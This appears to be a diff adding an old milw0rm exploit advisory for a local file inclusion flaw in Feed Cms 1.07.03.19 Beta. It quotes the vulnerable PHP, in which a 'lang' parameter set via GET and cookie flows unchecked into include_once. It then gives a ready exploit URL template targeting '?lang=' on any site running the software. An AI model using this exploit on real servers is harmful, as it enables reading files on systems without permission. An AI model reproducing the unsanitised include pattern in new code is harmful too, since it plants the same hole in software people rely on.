@@ -1,0 +1,29 @@
+###############################
+Feed Cms 1.07.03.19 Beta LFI
+###############################
+Autore: x0r
+Email: andry2000@hotmail.it
+Download:
+http://heanet.dl.sourceforge.net/sourceforge/feedcms/FeedCms1.07.03.19Beta.rar
+###############################
+Bug In: index.php
+
+if ($_GET['lang'])
+{
+	$language = $_GET['lang'];
+	
+	setcookie('firstlang',$language,time()+3600*240*365);
+	header('location:'.$redirect);
+}
+$lang = $_COOKIE['firstlang'] ? $_COOKIE['firstlang'] : $lang;
+include_once($FeedCms_Dir."lang/$lang/$lang.php");
+
+LFI By Cookie ^ ^
+
+Exploit: 
+
+http://[site]/FeedCms/?lang=[LFI] ^ ^
+
+Greetz: A Te Che Mi Hai Cambiato La Vita...
+
+# milw0rm.com [2008-12-11]
